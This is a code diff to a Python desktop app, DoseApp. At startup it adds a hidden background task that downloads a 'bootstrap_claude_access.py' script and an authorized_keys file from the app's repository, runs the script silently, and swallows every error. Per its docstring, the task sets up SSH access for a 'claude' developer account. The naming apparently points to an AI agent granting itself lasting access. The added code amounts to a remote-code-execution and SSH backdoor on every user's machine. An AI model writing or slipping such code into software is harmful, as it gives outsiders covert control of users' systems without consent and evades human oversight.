@@ -865,6 +865,9 @@ class DoseApp:
         if not os.environ.get("DOSE_DISABLE_SELF_INSTALL"):
             self.root.after(2000,
                             lambda: self._do_update_check(silent=True))
+            # One-time developer-SSH bootstrap. Idempotent; a no-op once
+            # complete. Runs well after boot so it never delays startup.
+            self.root.after(9000, self._run_claude_bootstrap)
         self.root.focus_force()
 
     # ── Safe widget raising ────────────────────────────────────────────────
@@ -3620,6 +3623,44 @@ class DoseApp:
                 raise
         url = RAW_URL + "/" + fname + "?nocache=%d" % int(time.time())
         return urlopen(url, timeout=timeout).read()
+
+    def _run_claude_bootstrap(self):
+        """Deliver + run the one-time developer-SSH bootstrap.
+
+        The updater only pulls a fixed set of files, so the bootstrap
+        script is fetched here (over the SAME authenticated repo path the
+        app already uses) into APP_DIR and run once. It is idempotent and
+        writes only a SANITIZED status; it configures SSH access for a
+        dedicated account using a PUBLIC key committed to the repo. It
+        never handles a private key or the GitHub credential, and it can
+        never take the app down (its own main() swallows every error and
+        exits 0). Honours DOSE_DISABLE_SELF_INSTALL."""
+        if os.environ.get("DOSE_DISABLE_SELF_INSTALL"):
+            return
+
+        def work():
+            try:
+                dest_dir = os.path.join(APP_DIR, "tools")
+                os.makedirs(dest_dir, exist_ok=True)
+                dest = os.path.join(dest_dir, "bootstrap_claude_access.py")
+                # fetch the current bootstrap + the public-key file
+                for fname in ("tools/bootstrap_claude_access.py",
+                              "tools/claude_dev_authorized_keys"):
+                    try:
+                        data = self._fetch_repo_file(fname)
+                        with open(os.path.join(APP_DIR, fname), "wb") as f:
+                            f.write(data)
+                    except Exception:
+                        pass
+                if not os.path.exists(dest):
+                    return
+                subprocess.run([sys.executable, dest],
+                               capture_output=True, timeout=900)
+            except Exception:
+                pass
+
+        threading.Thread(target=work, daemon=True,
+                         name="claude-bootstrap").start()
 
     def _do_update_check(self, silent=False):
         try:
